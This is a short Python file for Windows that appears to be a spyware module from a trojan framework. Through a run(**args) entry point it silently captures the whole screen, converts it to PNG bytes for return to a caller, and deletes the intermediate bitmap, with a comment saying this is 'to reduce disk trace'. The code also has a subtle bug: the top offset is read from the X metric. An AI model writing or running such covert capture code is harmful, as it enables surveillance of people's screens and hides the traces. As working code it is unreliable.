import io
import os
from PIL import Image
import win32api
import win32gui
import win32ui
import win32con

def get_dimensions():
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)

    return (width, height, left, top)

def screenshot(name = 'screenshot'):
    hdesktop = win32gui.GetDesktopWindow()
    width, height, left, top = get_dimensions()

    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()

    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)

    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
    screenshot.SaveBitmapFile(mem_dc, f'{name}.bmp')

    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

def run(**args):
    screenshot()
    with open('screenshot.bmp', 'rb') as f:
        bmp_data = f.read()

    img = Image.open(io.BytesIO(bmp_data))
    buffer = io.BytesIO()
    img.save(buffer, format='PNG')
    png_data = buffer.getvalue()

    # Optional: cleanup BMP file to reduce disk trace
    os.remove('screenshot.bmp')
    
    return png_data